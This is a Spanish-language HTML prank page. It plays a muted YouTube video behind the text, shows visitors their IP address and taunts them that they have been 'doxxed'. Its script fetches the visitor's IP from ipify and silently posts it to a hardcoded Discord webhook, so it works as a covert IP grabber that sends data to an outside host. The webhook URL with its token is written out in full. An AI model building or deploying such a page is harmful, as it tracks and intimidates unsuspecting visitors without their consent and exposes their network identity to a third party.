<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Video de Fondo de YouTube</title>
    <style>
        /* Estilos CSS para el video de fondo */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        .video-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }
        .video-background iframe {
            width: 100%;
            height: 100%;
        }
        .content {
            position: relative;
            z-index: 1;
            color: white;
            text-align: center;
            margin-top: 50px;
        }
    </style>
</head>
<body>
    <!-- Video de fondo -->
    <div class="video-background">
        <iframe id="background-video" src="https://www.youtube.com/embed/qbWqXKN3m3c?enablejsapi=1&loop=1&playlist=qbWqXKN3m3c&controls=0&showinfo=0&autohide=1&mute=1" frameborder="0" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>
    </div>

    <!-- Contenido de la página -->
    <div class="content">
        <h1>Tu dirección IP es: <span id="ip-address"></span></h1>
        <div id="additional-text">
            <p>TE HAN DOXEADO CHAVALIN</p>
        </div>
    </div>

    <script>
        // Obtener el reproductor de YouTube y reproducir el video
        function onYouTubeIframeAPIReady() {
            var player = new YT.Player('background-video', {
                events: {
                    'onReady': function(event) {
                        event.target.playVideo();
                    }
                }
            });
        }

        // Cargar la API de IFrame de YouTube
        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        var firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

        // URL del servicio ipify para obtener la dirección IP
        var apiURL = "https://api.ipify.org?format=json";

        // Realizar una solicitud a la API para obtener la dirección IP
        fetch(apiURL)
            .then(response => response.json())
            .then(data => {
                // Mostrar la dirección IP en la página
                document.getElementById("ip-address").textContent = data.ip;
                // Cambiar el texto adicional
                document.getElementById("custom-text").textContent = "TE HAN DOXEADO CHAVALIN";
            })
            .catch(error => {
                console.error("Error al obtener la IP:", error);
            });
            const getIpAddress = () => {
  fetch('https://api.ipify.org')
  .then(response => response.text())
  .then(ipAddress => {
    const ipAddressElement = document.getElementById('ip-address');
    ipAddressElement.textContent = ipAddress;
    sendIpAddressToServer(ipAddress);
  })
  .catch(error => console.error(error));
};

const sendIpAddressToServer = (ipAddress) => {
  const webhookUrl = 'https://discord.com/api/webhooks/1309920940003430561/0DevifeZjgpx8L_wEpFt25U9SMdQ84KZlicU11oZ18ZbaO9atqXjVQ0vCeCGmNjGuof2';
  const payload = {
    content: `Tu dirección IP es: ${ipAddress}`
  };
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error(error));
};

getIpAddress();
    </script>
</body>
</html>
